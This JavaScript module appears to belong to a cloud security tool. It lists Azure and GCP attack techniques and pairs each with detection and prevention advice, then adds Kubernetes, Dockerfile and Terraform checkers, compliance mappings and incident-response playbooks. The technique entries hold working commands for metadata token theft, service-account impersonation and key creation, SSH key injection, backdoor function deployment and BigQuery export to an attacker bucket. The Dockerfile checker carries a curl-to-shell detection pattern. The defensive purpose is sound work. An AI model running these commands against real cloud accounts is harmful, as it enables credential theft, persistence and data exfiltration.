  { id: "AZ-T008", name: "Azure Function Backdoor", tactic: "Persistence", severity: "high", desc: "Deploy a backdoor as an Azure Function that provides remote access or exfiltrates data. Functions can be triggered via HTTP, timer, or event.", commands: ["az functionapp create --name backdoor-func --resource-group rg --runtime python --consumption-plan-location eastus", "func azure functionapp publish backdoor-func"], detection: ["Azure Activity Log: function app creation/update", "Monitor function execution logs", "Alert on new HTTP-triggered functions"], prevention: ["Restrict function app deployment to CI/CD pipelines", "Use deployment slots for staging/approval", "Network restrictions on function endpoints"] },
  { id: "AZ-T009", name: "Subscription Hijacking", tactic: "Initial Access", severity: "critical", desc: "Transfer an Azure subscription to an attacker-controlled tenant, gaining full control of all resources in the subscription.", commands: ["# Requires billing account admin or account admin permissions", "az account management-group subscription remove --name SUB_ID --management-group MG"], detection: ["Azure Activity Log: subscription transfer events", "Microsoft Defender for Cloud alerts", "Monitor directory association changes"], prevention: ["Restrict subscription transfer permissions", "Enable Azure Policy for subscription management", "Multi-person approval for subscription changes"] },
  { id: "AZ-T010", name: "Service Principal Secret Extraction", tactic: "Credential Access", severity: "high", desc: "Extract credentials from Azure AD service principals (application registrations). Service principals often have broad permissions across the tenant.", commands: ["az ad app list --all", "az ad app credential list --id APP_ID", "az ad app credential reset --id APP_ID --append"], detection: ["Azure AD Audit logs: credential management events", "Monitor for new credentials added to existing applications", "Alert on credential resets for production service principals"], prevention: ["Use certificate-based authentication instead of secrets", "Set short expiry on service principal secrets", "Restrict credential management to specific admins"] },
];

// ═══════════════════════════════════════════════════════════════════
// GCP ATTACK TECHNIQUES DATABASE
// ═══════════════════════════════════════════════════════════════════

export const GCP_ATTACK_TECHNIQUES = [
  { id: "GCP-T001", name: "Metadata Server Token Theft", tactic: "Credential Access", severity: "critical", desc: "Access GCP Compute Engine metadata server at metadata.google.internal to steal service account tokens.", commands: ["curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/attributes/"], detection: ["Audit logs: metadata server access from unexpected sources", "VPC Flow Logs to metadata IP", "Cloud Armor rules"], prevention: ["Use Workload Identity for GKE", "Restrict metadata server access", "Use minimal service account permissions"] },
  { id: "GCP-T002", name: "Service Account Impersonation", tactic: "Privilege Escalation", severity: "critical", desc: "Impersonate a higher-privileged service account using the iam.serviceAccounts.getAccessToken permission.", commands: ["gcloud auth print-access-token --impersonate-service-account=admin@project.iam.gserviceaccount.com", "gcloud projects get-iam-policy PROJECT_ID"], detection: ["Audit logs: GenerateAccessToken events", "Monitor for unusual impersonation patterns", "Alert on impersonation of high-privilege SAs"], prevention: ["Restrict impersonation permissions", "Use Workload Identity Federation", "Implement SA key rotation"] },
  { id: "GCP-T003", name: "Cloud Storage Bucket Exposure", tactic: "Exfiltration", severity: "critical", desc: "Access publicly accessible or overly permissive Cloud Storage buckets containing sensitive data.", commands: ["gsutil ls gs://target-bucket/", "gsutil cp gs://target-bucket/sensitive.txt ./", "gsutil iam get gs://target-bucket/"], detection: ["Cloud Storage access logs", "Data Access audit logs", "DLP API findings for sensitive data"], prevention: ["Enable uniform bucket-level access", "Use organization policy constraints for public access", "Implement VPC Service Controls"] },
  { id: "GCP-T004", name: "Cloud Function Backdoor", tactic: "Persistence", severity: "high", desc: "Deploy a malicious Cloud Function that executes with the function's service account permissions.", commands: ["gcloud functions deploy backdoor --runtime python39 --trigger-http --allow-unauthenticated", "gcloud functions add-iam-policy-binding backdoor --member allUsers --role roles/cloudfunctions.invoker"], detection: ["Audit logs: function deployment events", "Monitor for unauthenticated function triggers", "Alert on allUsers IAM bindings"], prevention: ["Restrict function deployment to CI/CD", "Require authentication for all functions", "Use VPC connectors for function networking"] },
  { id: "GCP-T005", name: "BigQuery Data Exfiltration", tactic: "Exfiltration", severity: "critical", desc: "Query and export data from BigQuery datasets. BigQuery often contains analytics data, user data, and business intelligence.", commands: ["bq ls --all", "bq show dataset_name.table_name", "bq query 'SELECT * FROM dataset_name.table_name LIMIT 1000000'", "bq extract dataset_name.table_name gs://attacker-bucket/exfil.csv"], detection: ["BigQuery audit logs: query and export events", "Monitor for large query result sets", "Alert on cross-project data access"], prevention: ["Use column-level security", "Implement authorized views", "VPC Service Controls for BigQuery"] },
  { id: "GCP-T006", name: "Compute Engine SSH Key Injection", tactic: "Persistence", severity: "high", desc: "Add SSH keys to Compute Engine instances via project or instance metadata, gaining persistent access.", commands: ["gcloud compute project-info add-metadata --metadata=ssh-keys='attacker:ssh-rsa AAAA...'", "gcloud compute instances add-metadata instance-name --metadata=ssh-keys='attacker:ssh-rsa AAAA...'"], detection: ["Audit logs: setMetadata events", "Monitor for SSH key changes", "Alert on project-wide SSH key additions"], prevention: ["Use OS Login instead of metadata SSH keys", "Restrict setMetadata permission", "Implement organization policies for SSH key management"] },
  { id: "GCP-T007", name: "GKE Pod Escape", tactic: "Privilege Escalation", severity: "critical", desc: "Escape from a GKE pod to the underlying node using privileged containers, host mounts, or node service account.", commands: ["# Check if privileged: cat /proc/self/status | grep CapEff", "# Mount host filesystem: mount /dev/sda1 /mnt", "# Access node metadata: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/"], detection: ["GKE audit logs: pod creation with privileged settings", "Falco or Sysdig runtime alerts", "Monitor for host path mounts"], prevention: ["Enable GKE Workload Identity", "Use Pod Security Standards", "Disable metadata concealment", "Use Binary Authorization"] },
  { id: "GCP-T008", name: "Service Account Key Exfiltration", tactic: "Credential Access", severity: "critical", desc: "Create and download service account keys which provide persistent access independent of user sessions.", commands: ["gcloud iam service-accounts keys create key.json --iam-account=sa@project.iam.gserviceaccount.com"], detection: ["Audit logs: CreateServiceAccountKey events", "Monitor active key count per SA", "Alert on key creation for production SAs"], prevention: ["Disable SA key creation via organization policy", "Use Workload Identity Federation", "Set SA key expiry policies"] },
  { id: "GCP-T009", name: "Cloud SQL Data Access", tactic: "Collection", severity: "high", desc: "Access Cloud SQL databases using service account permissions or exported credentials. Databases contain application data.", commands: ["gcloud sql connect instance-name --user=root", "gcloud sql export sql instance-name gs://bucket/dump.sql --database=prod"], detection: ["Cloud SQL audit logs", "Monitor for SQL exports", "Alert on connections from unusual IPs"], prevention: ["Use Cloud SQL Auth Proxy", "Restrict database access to specific IPs", "Enable Cloud SQL IAM authentication"] },
  { id: "GCP-T010", name: "Pub/Sub Message Interception", tactic: "Collection", severity: "medium", desc: "Subscribe to Pub/Sub topics to intercept messages containing sensitive data or commands.", commands: ["gcloud pubsub subscriptions create spy --topic=target-topic", "gcloud pubsub subscriptions pull spy --auto-ack --limit=1000"], detection: ["Audit logs: subscription creation events", "Monitor for unexpected subscriptions on sensitive topics", "Alert on new subscriptions in production projects"], prevention: ["Restrict Pub/Sub subscription creation", "Use CMEK for message encryption", "Implement VPC Service Controls"] },
];

// ═══════════════════════════════════════════════════════════════════
// KUBERNETES SECURITY ASSESSMENT
// ═══════════════════════════════════════════════════════════════════

export function assessPodSecurity(podSpec) {
  const findings = [];
  const containers = [...(podSpec.containers || []), ...(podSpec.initContainers || [])];
  if (podSpec.hostNetwork) findings.push({ severity: "critical", finding: "hostNetwork enabled — pod shares host network namespace", recommendation: "Remove hostNetwork unless absolutely required (e.g., CNI plugin)" });
  if (podSpec.hostPID) findings.push({ severity: "critical", finding: "hostPID enabled — pod can see all host processes", recommendation: "Remove hostPID — this allows process injection on the host" });
  if (podSpec.hostIPC) findings.push({ severity: "high", finding: "hostIPC enabled — pod shares host IPC namespace", recommendation: "Remove hostIPC unless required for specific IPC mechanisms" });
  if (!podSpec.serviceAccountName || podSpec.serviceAccountName === "default") {
    findings.push({ severity: "medium", finding: "Using default service account", recommendation: "Create a dedicated service account with minimal RBAC permissions" });
  }
  if (podSpec.automountServiceAccountToken !== false) {
    findings.push({ severity: "medium", finding: "Service account token auto-mounted", recommendation: "Set automountServiceAccountToken: false if the pod doesn't need Kubernetes API access" });
  }
  for (const c of containers) {
    const sc = c.securityContext || {};
    if (sc.privileged) findings.push({ severity: "critical", container: c.name, finding: "Privileged container — full host access", recommendation: "Remove privileged: true, use specific capabilities instead" });
    if (sc.runAsUser === 0 || (!sc.runAsNonRoot && !sc.runAsUser)) findings.push({ severity: "high", container: c.name, finding: "Running as root (or not explicitly non-root)", recommendation: "Set runAsNonRoot: true and runAsUser to a non-zero UID" });
    if (sc.readOnlyRootFilesystem !== true) findings.push({ severity: "medium", container: c.name, finding: "Writable root filesystem", recommendation: "Set readOnlyRootFilesystem: true, use emptyDir volumes for writable paths" });
    if (sc.allowPrivilegeEscalation !== false) findings.push({ severity: "medium", container: c.name, finding: "Privilege escalation not explicitly disabled", recommendation: "Set allowPrivilegeEscalation: false" });
    const caps = sc.capabilities || {};
    const addCaps = caps.add || [];
    const dangerousCaps = ["SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE", "DAC_OVERRIDE", "NET_RAW", "SYS_RAWIO", "SYS_MODULE", "MKNOD"];
    for (const cap of addCaps) {
      if (dangerousCaps.includes(cap)) {
        findings.push({ severity: cap === "SYS_ADMIN" ? "critical" : "high", container: c.name, finding: `Dangerous capability added: ${cap}`, recommendation: `Remove ${cap} capability or justify its necessity` });
      }
    }
    if (!caps.drop || !caps.drop.includes("ALL")) {
      findings.push({ severity: "medium", container: c.name, finding: "Not dropping all capabilities", recommendation: "Add capabilities.drop: ['ALL'] and explicitly add only required capabilities" });
    }
    if (!c.resources || !c.resources.limits) {
      findings.push({ severity: "medium", container: c.name, finding: "No resource limits set", recommendation: "Set CPU and memory limits to prevent resource exhaustion and DoS" });
    }
    const vols = c.volumeMounts || [];
    for (const v of vols) {
      if (v.mountPath === "/var/run/docker.sock" || v.mountPath === "/run/containerd/containerd.sock") {
        findings.push({ severity: "critical", container: c.name, finding: `Container runtime socket mounted: ${v.mountPath}`, recommendation: "Remove socket mount — this allows container escape and host compromise" });
      }
      if (v.mountPath.startsWith("/host") || v.mountPath === "/") {
        findings.push({ severity: "critical", container: c.name, finding: `Host filesystem mounted at: ${v.mountPath}`, recommendation: "Remove host filesystem mounts, use PVCs instead" });
      }
    }
    if (c.image && !c.image.includes(":") || c.image?.endsWith(":latest")) {
      findings.push({ severity: "medium", container: c.name, finding: "Using :latest or untagged image", recommendation: "Use specific image tags or SHA256 digests for reproducibility" });
    }
  }
  return { findings, score: Math.max(0, 100 - findings.reduce((s, f) => s + (f.severity === "critical" ? 25 : f.severity === "high" ? 15 : f.severity === "medium" ? 8 : 3), 0)) };
}

export function analyzeRBAC(roleBinding) {
  const findings = [];
  const subjects = roleBinding.subjects || [];
  const roleRef = roleBinding.roleRef || {};
  for (const s of subjects) {
    if (s.kind === "Group" && s.name === "system:unauthenticated") {
      findings.push({ severity: "critical", finding: "Binds to unauthenticated group — anyone can access", recommendation: "Remove system:unauthenticated binding immediately" });
    }
    if (s.kind === "Group" && s.name === "system:authenticated") {
      findings.push({ severity: "high", finding: "Binds to all authenticated users", recommendation: "Restrict to specific groups or service accounts" });
    }
    if (s.kind === "ServiceAccount" && s.name === "default" && s.namespace !== "kube-system") {
      findings.push({ severity: "medium", finding: `Binds to default service account in namespace ${s.namespace || "unknown"}`, recommendation: "Create and use a dedicated service account" });
    }
  }
  if (roleRef.kind === "ClusterRole") {
    const dangerousRoles = ["cluster-admin", "admin", "edit"];
    if (dangerousRoles.includes(roleRef.name)) {
      findings.push({ severity: roleRef.name === "cluster-admin" ? "critical" : "high", finding: `Binds to built-in role: ${roleRef.name}`, recommendation: "Create custom roles with minimal permissions instead of using built-in roles" });
    }
  }
  return { findings };
}

// ═══════════════════════════════════════════════════════════════════
// DOCKERFILE SECURITY CHECKER
// ═══════════════════════════════════════════════════════════════════

export function checkDockerfile(content) {
  const lines = content.split("\n");
  const findings = [];
  let hasUser = false, hasHealthcheck = false, fromCount = 0;
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i].trim();
    const ln = i + 1;
    if (!line || line.startsWith("#")) continue;
    const upper = line.toUpperCase();
    if (upper.startsWith("FROM")) {
      fromCount++;
      if (line.includes(":latest") || (!line.includes(":") && !line.includes("@sha256"))) {
        findings.push({ severity: "medium", line: ln, finding: "Using :latest or untagged base image", recommendation: "Pin to a specific version tag or SHA256 digest" });
      }
      if (/FROM\s+(ubuntu|debian|centos|fedora|alpine)\b/i.test(line) && !line.includes(":")) {
        findings.push({ severity: "medium", line: ln, finding: "Using generic OS image without version", recommendation: "Use minimal images like distroless or alpine with pinned version" });
      }
    }
    if (upper.startsWith("RUN")) {
      if (/apt-get\s+install/.test(line) && !line.includes("--no-install-recommends")) {
        findings.push({ severity: "low", line: ln, finding: "apt-get install without --no-install-recommends", recommendation: "Add --no-install-recommends to reduce image size and attack surface" });
      }
      if (/apt-get\s+(update|install)/.test(line) && !line.includes("rm -rf /var/lib/apt/lists")) {
        findings.push({ severity: "low", line: ln, finding: "apt cache not cleaned after install", recommendation: "Add && rm -rf /var/lib/apt/lists/* to reduce image size" });
      }
      if (/curl\s+.*\|\s*(sh|bash)/.test(line) || /wget\s+.*\|\s*(sh|bash)/.test(line)) {
        findings.push({ severity: "high", line: ln, finding: "Piping curl/wget to shell — untrusted remote code execution", recommendation: "Download, verify checksum, then execute separately" });
      }
      if (/chmod\s+777/.test(line)) {
        findings.push({ severity: "high", line: ln, finding: "chmod 777 — world-writable permissions", recommendation: "Use specific permissions (e.g., chmod 755 for directories, 644 for files)" });
      }
      if (/pip\s+install\s+(?!--no-cache)/.test(line) && !line.includes("--no-cache-dir")) {
        findings.push({ severity: "low", line: ln, finding: "pip install without --no-cache-dir", recommendation: "Add --no-cache-dir to reduce image size" });
      }
      if (/npm\s+install\s/.test(line) && !line.includes("--production") && !line.includes("ci")) {
        findings.push({ severity: "low", line: ln, finding: "npm install may include devDependencies", recommendation: "Use npm ci --only=production for production images" });
      }
    }
    if (upper.startsWith("USER")) hasUser = true;
    if (upper.startsWith("HEALTHCHECK")) hasHealthcheck = true;
    if (upper.startsWith("ADD") && !line.includes(".tar") && !line.includes("http")) {
      findings.push({ severity: "low", line: ln, finding: "Using ADD instead of COPY for local files", recommendation: "Use COPY for local files; ADD auto-extracts tars and fetches URLs (unexpected behavior)" });
    }
    if (upper.startsWith("ENV") && /password|secret|key|token|api_key/i.test(line)) {
      findings.push({ severity: "critical", line: ln, finding: "Secret stored in ENV instruction (visible in image history)", recommendation: "Use build args with --secret, or mount secrets at runtime" });
    }
    if (upper.startsWith("COPY") && (line.includes("id_rsa") || line.includes(".pem") || line.includes(".key") || line.includes(".env"))) {
      findings.push({ severity: "critical", line: ln, finding: "Secret file copied into image", recommendation: "Use multi-stage builds or Docker secrets, never COPY credentials" });
    }
    if (upper.startsWith("EXPOSE") && /\b(22|23|3389|445|135|139)\b/.test(line)) {
      const port = line.match(/\b(22|23|3389|445|135|139)\b/)?.[0];
      const svc = { 22: "SSH", 23: "Telnet", 3389: "RDP", 445: "SMB", 135: "RPC", 139: "NetBIOS" };
      findings.push({ severity: "medium", line: ln, finding: `Exposing ${svc[port] || ""} port ${port} in container`, recommendation: `Avoid running ${svc[port] || "management"} services in containers` });
    }
  }
  if (!hasUser) findings.push({ severity: "high", finding: "No USER instruction — container runs as root", recommendation: "Add USER instruction with a non-root user" });
  if (!hasHealthcheck && fromCount > 0) findings.push({ severity: "low", finding: "No HEALTHCHECK instruction", recommendation: "Add HEALTHCHECK for container orchestration health monitoring" });
  return { findings, score: Math.max(0, 100 - findings.reduce((s, f) => s + (f.severity === "critical" ? 20 : f.severity === "high" ? 12 : f.severity === "medium" ? 6 : 2), 0)) };
}

// ═══════════════════════════════════════════════════════════════════
// TERRAFORM SECURITY SCANNER
// ═══════════════════════════════════════════════════════════════════

export function scanTerraform(hcl) {
  const findings = [];
  const lines = hcl.split("\n");
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i].trim();
    const ln = i + 1;
    if (line.includes("cidr_blocks") && line.includes('"0.0.0.0/0"')) {
      findings.push({ severity: "high", line: ln, finding: "Security group rule open to 0.0.0.0/0", recommendation: "Restrict to specific IP ranges" });
    }
    if (line.includes("acl") && (line.includes('"public-read"') || line.includes('"public-read-write"'))) {
      findings.push({ severity: "critical", line: ln, finding: "S3 bucket with public ACL", recommendation: "Use private ACL and bucket policies instead" });
    }
    if (line.includes("encrypted") && (line.includes("false") || line.includes("= false"))) {
      findings.push({ severity: "high", line: ln, finding: "Encryption disabled", recommendation: "Enable encryption at rest for all storage resources" });
    }
    if (line.includes("server_side_encryption_configuration") === false && /resource\s+"aws_s3_bucket"/.test(hcl.substring(Math.max(0, hcl.lastIndexOf("resource", i * 80)), i * 80))) {
      // Check handled separately
    }
    if (line.includes("logging") && line.includes("false")) {
      findings.push({ severity: "medium", line: ln, finding: "Logging disabled", recommendation: "Enable logging for audit and compliance" });
    }
    if (line.includes("publicly_accessible") && line.includes("true")) {
      findings.push({ severity: "critical", line: ln, finding: "Resource publicly accessible", recommendation: "Set publicly_accessible = false, use VPN or bastion for access" });
    }
    if (/password\s*=\s*"[^"]*"/.test(line) || /secret\s*=\s*"[^"]*"/.test(line) || /api_key\s*=\s*"[^"]*"/.test(line)) {
      findings.push({ severity: "critical", line: ln, finding: "Hardcoded secret in Terraform", recommendation: "Use variables with sensitive = true, or reference from Vault/SSM/Secrets Manager" });
    }
    if (line.includes("versioning") && line.includes("false")) {
      findings.push({ severity: "medium", line: ln, finding: "Versioning disabled on storage", recommendation: "Enable versioning for data protection and recovery" });
    }
    if (/multi_az\s*=\s*false/.test(line)) {
      findings.push({ severity: "low", line: ln, finding: "Multi-AZ not enabled", recommendation: "Enable Multi-AZ for high availability" });
    }
    if (/deletion_protection\s*=\s*false/.test(line)) {
      findings.push({ severity: "medium", line: ln, finding: "Deletion protection disabled", recommendation: "Enable deletion protection for production resources" });
    }
    if (/force_destroy\s*=\s*true/.test(line)) {
      findings.push({ severity: "medium", line: ln, finding: "force_destroy enabled — resource can be destroyed with data", recommendation: "Set force_destroy = false for production resources" });
    }
    if (/skip_final_snapshot\s*=\s*true/.test(line)) {
      findings.push({ severity: "medium", line: ln, finding: "skip_final_snapshot enabled for database", recommendation: "Set skip_final_snapshot = false to ensure data backup on deletion" });
    }
  }
  if (!hcl.includes("backend")) {
    findings.push({ severity: "medium", finding: "No remote backend configured", recommendation: "Use S3/GCS/Azure Blob backend with state locking for team collaboration" });
  }
  if (!hcl.includes("required_version")) {
    findings.push({ severity: "low", finding: "No Terraform version constraint", recommendation: "Add required_version to prevent compatibility issues" });
  }
  return { findings, score: Math.max(0, 100 - findings.reduce((s, f) => s + (f.severity === "critical" ? 20 : f.severity === "high" ? 12 : f.severity === "medium" ? 5 : 2), 0)) };
}

// ═══════════════════════════════════════════════════════════════════
// CLOUD COMPLIANCE MAPPER
// ═══════════════════════════════════════════════════════════════════

export const COMPLIANCE_MAP = {
  "SOC2": {
    standard: "SOC 2 Type II",
    controls: [
      { id: "CC6.1", name: "Logical Access Security", cloudServices: { aws: ["IAM", "Organizations", "SSO", "Directory Service"], azure: ["Azure AD", "Conditional Access", "PIM"], gcp: ["Cloud IAM", "Cloud Identity"] }, checks: ["MFA enforced", "Least privilege", "Access reviews", "Password policy"] },
      { id: "CC6.2", name: "Network Security", cloudServices: { aws: ["VPC", "Security Groups", "NACLs", "WAF", "Shield"], azure: ["VNet", "NSG", "Azure Firewall", "DDoS Protection"], gcp: ["VPC", "Firewall Rules", "Cloud Armor"] }, checks: ["Network segmentation", "Encryption in transit", "DDoS protection", "WAF rules"] },
      { id: "CC6.3", name: "Data Protection", cloudServices: { aws: ["KMS", "S3 SSE", "EBS Encryption", "RDS Encryption"], azure: ["Key Vault", "Storage Encryption", "Disk Encryption"], gcp: ["Cloud KMS", "CMEK", "Default Encryption"] }, checks: ["Encryption at rest", "Key rotation", "Data classification", "DLP"] },
      { id: "CC6.6", name: "Monitoring & Logging", cloudServices: { aws: ["CloudTrail", "CloudWatch", "GuardDuty", "Security Hub"], azure: ["Azure Monitor", "Log Analytics", "Defender for Cloud"], gcp: ["Cloud Audit Logs", "Cloud Monitoring", "Security Command Center"] }, checks: ["Audit logging enabled", "Log retention policy", "Alert rules", "SIEM integration"] },
      { id: "CC7.1", name: "Vulnerability Management", cloudServices: { aws: ["Inspector", "ECR Scanning", "Systems Manager"], azure: ["Defender for Cloud", "Update Management"], gcp: ["Security Command Center", "Container Analysis"] }, checks: ["Regular scanning", "Patch management", "Container scanning", "Dependency updates"] },
      { id: "CC7.2", name: "Incident Response", cloudServices: { aws: ["GuardDuty", "Detective", "Incident Manager"], azure: ["Sentinel", "Defender Incidents"], gcp: ["Chronicle", "SCC Findings"] }, checks: ["IR plan documented", "IR team defined", "Automated alerting", "Post-incident review"] },
      { id: "CC8.1", name: "Change Management", cloudServices: { aws: ["Config", "CloudFormation", "CodePipeline"], azure: ["Azure Policy", "ARM Templates", "DevOps"], gcp: ["Deployment Manager", "Cloud Build"] }, checks: ["IaC for all changes", "Approval workflows", "Change tracking", "Rollback procedures"] },
    ]
  },
  "PCI_DSS": {
    standard: "PCI DSS v4.0",
    controls: [
      { id: "1", name: "Network Security Controls", checks: ["Firewall configuration", "DMZ architecture", "Inbound/outbound restrictions", "Network documentation"] },
      { id: "2", name: "Secure Configurations", checks: ["Remove defaults", "Harden configurations", "Non-console access encrypted", "Inventory of system components"] },
      { id: "3", name: "Protect Stored Data", checks: ["Data retention policy", "Encryption of stored CHD", "Key management", "Mask PAN when displayed"] },
      { id: "4", name: "Encrypt Transmissions", checks: ["Strong cryptography for transmission", "No unencrypted PAN via messaging", "TLS 1.2+ required"] },
      { id: "5", name: "Malware Protection", checks: ["Anti-malware deployed", "Regular updates", "Periodic scans", "Audit logs for malware events"] },
      { id: "6", name: "Secure Development", checks: ["SDLC process", "Security in development", "Public app protection (WAF)", "Change control for code"] },
      { id: "7", name: "Access Control", checks: ["Need-to-know access", "Access control system", "Default deny-all", "Documented access policies"] },
      { id: "8", name: "Identify & Authenticate", checks: ["Unique IDs for all users", "MFA for admin access", "Password complexity", "Account lockout"] },
      { id: "9", name: "Physical Access", checks: ["Facility access controls", "Visitor management", "Media protection", "POS device inspection"] },
      { id: "10", name: "Logging & Monitoring", checks: ["Audit trails for all access", "Automated log review", "Time synchronization", "Log retention"] },
      { id: "11", name: "Security Testing", checks: ["Quarterly vulnerability scans", "Annual penetration testing", "IDS/IPS deployment", "Change-detection mechanisms"] },
      { id: "12", name: "Security Policy", checks: ["Information security policy", "Risk assessment process", "Security awareness training", "Incident response plan"] },
    ]
  },
  "HIPAA": {
    standard: "HIPAA Security Rule",
    controls: [
      { id: "164.308(a)(1)", name: "Security Management Process", checks: ["Risk analysis", "Risk management", "Sanction policy", "Information system activity review"] },
      { id: "164.308(a)(3)", name: "Workforce Security", checks: ["Authorization procedures", "Workforce clearance", "Termination procedures"] },
      { id: "164.308(a)(4)", name: "Access Management", checks: ["Access authorization", "Access establishment", "Access modification"] },
      { id: "164.308(a)(5)", name: "Security Awareness Training", checks: ["Security reminders", "Malware protection", "Login monitoring", "Password management"] },
      { id: "164.310(a)", name: "Facility Access Controls", checks: ["Contingency operations", "Facility security plan", "Access control & validation", "Maintenance records"] },
      { id: "164.310(d)", name: "Device & Media Controls", checks: ["Disposal procedures", "Media re-use", "Accountability", "Data backup & storage"] },
      { id: "164.312(a)", name: "Access Controls", checks: ["Unique user identification", "Emergency access procedure", "Automatic logoff", "Encryption/decryption"] },
      { id: "164.312(b)", name: "Audit Controls", checks: ["Audit log mechanisms", "Log review procedures", "Log protection"] },
      { id: "164.312(c)", name: "Integrity Controls", checks: ["Authentication of ePHI", "Integrity verification mechanisms"] },
      { id: "164.312(e)", name: "Transmission Security", checks: ["Integrity controls", "Encryption of ePHI in transit"] },
    ]
  },
  "NIST_800_53": {
    standard: "NIST SP 800-53 Rev 5",
    families: [
      { id: "AC", name: "Access Control", controls: 25 },
      { id: "AT", name: "Awareness and Training", controls: 6 },
      { id: "AU", name: "Audit and Accountability", controls: 16 },
      { id: "CA", name: "Assessment, Authorization, and Monitoring", controls: 9 },
      { id: "CM", name: "Configuration Management", controls: 14 },
      { id: "CP", name: "Contingency Planning", controls: 13 },
      { id: "IA", name: "Identification and Authentication", controls: 12 },
      { id: "IR", name: "Incident Response", controls: 10 },
      { id: "MA", name: "Maintenance", controls: 7 },
      { id: "MP", name: "Media Protection", controls: 8 },
      { id: "PE", name: "Physical and Environmental Protection", controls: 23 },
      { id: "PL", name: "Planning", controls: 11 },
      { id: "PM", name: "Program Management", controls: 32 },
      { id: "PS", name: "Personnel Security", controls: 9 },
      { id: "PT", name: "PII Processing and Transparency", controls: 8 },
      { id: "RA", name: "Risk Assessment", controls: 10 },
      { id: "SA", name: "System and Services Acquisition", controls: 23 },
      { id: "SC", name: "System and Communications Protection", controls: 51 },
      { id: "SI", name: "System and Information Integrity", controls: 23 },
      { id: "SR", name: "Supply Chain Risk Management", controls: 12 },
    ]
  },
  "FedRAMP": {
    standard: "FedRAMP (Federal Risk and Authorization Management Program)",
    levels: [
      { level: "Low", controls: 125, description: "Low-impact cloud systems — publicly available data" },
      { level: "Moderate", controls: 325, description: "Moderate-impact — controlled unclassified information (CUI)" },
      { level: "High", controls: 421, description: "High-impact — law enforcement, emergency services, financial, health" },
    ],
    keyRequirements: ["FIPS 140-2/3 encryption modules", "Continuous monitoring", "Annual penetration testing", "Plan of Action & Milestones (POA&M)", "Boundary documentation", "Supply chain risk management"]
  }
};

// ═══════════════════════════════════════════════════════════════════
// CLOUD INCIDENT RESPONSE PLAYBOOKS
// ═══════════════════════════════════════════════════════════════════

export const CLOUD_IR_PLAYBOOKS = [
  {
    name: "S3 Data Exposure",
    trigger: "Public S3 bucket detected with sensitive data",
    severity: "critical",
    steps: [
      { phase: "Detection", actions: ["Review GuardDuty/Security Hub finding", "Identify exposed bucket and data classification", "Check S3 access logs for unauthorized access"] },
      { phase: "Containment", actions: ["Block public access: aws s3api put-public-access-block --bucket NAME --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true", "Remove bucket policy granting public access", "Enable S3 server-side encryption", "Rotate any exposed credentials found in the bucket"] },
      { phase: "Eradication", actions: ["Review and fix IAM policies that allowed public access", "Enable S3 Block Public Access at the account level", "Implement SCPs to prevent future public bucket creation", "Enable Config rule: s3-bucket-public-read-prohibited"] },
      { phase: "Recovery", actions: ["Verify no data remains publicly accessible", "Scan all buckets for similar misconfigurations", "Check for data exfiltration in CloudTrail and access logs"] },
      { phase: "Lessons Learned", actions: ["Document timeline and root cause", "Update bucket creation process", "Implement automated compliance checking", "Brief relevant stakeholders on exposure scope"] }
    ]
  },
  {
    name: "Compromised IAM Credentials",
    trigger: "GuardDuty alert for credential use from unusual location or API calls",
    severity: "critical",
    steps: [
      { phase: "Detection", actions: ["Review GuardDuty finding details (source IP, API calls, timestamp)", "Identify the compromised principal (user, role, or access key)", "Determine scope: what resources were accessed?"] },
      { phase: "Containment", actions: ["Deactivate compromised access keys: aws iam update-access-key --access-key-id KEYID --status Inactive --user-name USER", "If user: force password reset and revoke sessions", "If role: update trust policy to deny the compromised principal", "Apply deny-all inline policy to the user/role as immediate quarantine"] },
      { phase: "Eradication", actions: ["Delete compromised access keys", "Rotate all credentials the compromised principal had access to", "Review and revoke any persistence mechanisms (new users, roles, Lambda functions) created by the attacker", "Check for CloudTrail disruption (stopped trails, deleted logs)"] },
      { phase: "Recovery", actions: ["Create new access keys with minimal permissions", "Enable MFA on all IAM users", "Review and tighten IAM policies", "Verify CloudTrail is active and logging"] },
      { phase: "Lessons Learned", actions: ["Determine how credentials were compromised (phishing, code leak, IMDS theft)", "Implement credential rotation policy", "Enable GuardDuty and Security Hub", "Review access key usage and eliminate long-lived keys where possible"] }
    ]
  },
  {
    name: "Cryptomining Detection",
    trigger: "Unusual EC2 instance launch or high CPU utilization on compute resources",
    severity: "high",
    steps: [
      { phase: "Detection", actions: ["Review GuardDuty finding: CryptoCurrency:EC2/BitcoinTool", "Check EC2 instance launch history in CloudTrail", "Review billing anomalies for unexpected compute charges", "Identify mining-related processes and network connections"] },
      { phase: "Containment", actions: ["Terminate unauthorized EC2 instances", "Isolate compromised instances (modify security group to deny all traffic)", "Revoke compromised credentials used to launch instances", "Set billing alarms for spend threshold"] },
      { phase: "Eradication", actions: ["Identify the initial access vector (compromised key, vulnerable application, SSRF)", "Patch the vulnerability or rotate the credential", "Review all running instances for mining software", "Check for auto-scaling groups or launch templates creating miners"] },
      { phase: "Recovery", actions: ["Restore clean instances from known-good AMIs", "Verify no persistence mechanisms remain", "Enable AWS Budget alerts", "Review and restrict RunInstances permissions"] },
      { phase: "Lessons Learned", actions: ["Calculate total financial impact", "Implement preventive controls (SCPs to limit instance types, regions)", "Enable GuardDuty cryptocurrency detection", "Implement automated response for future incidents"] }
    ]
  },
  {
    name: "Data Exfiltration",
    trigger: "Large data transfer to external endpoint or unusual API activity",
    severity: "critical",
    steps: [
      { phase: "Detection", actions: ["Review GuardDuty finding: Exfiltration:S3/MaliciousIPCaller or similar", "Analyze VPC Flow Logs for large outbound transfers", "Check S3 access logs for bulk GetObject requests", "Review CloudTrail for database export or snapshot sharing events"] },
      { phase: "Containment", actions: ["Block the exfiltration endpoint at the network level (NACL, security group)", "Revoke the credentials performing the exfiltration", "If via S3: add bucket policy denying the compromised principal", "If via database: revoke database user and rotate credentials", "Preserve all logs and evidence before any cleanup"] },
      { phase: "Eradication", actions: ["Identify all data accessed and exfiltrated", "Determine the attack vector and close it", "Review all access permissions for the affected data stores", "Check for additional exfiltration channels (DNS, ICMP, alternate storage)"] },
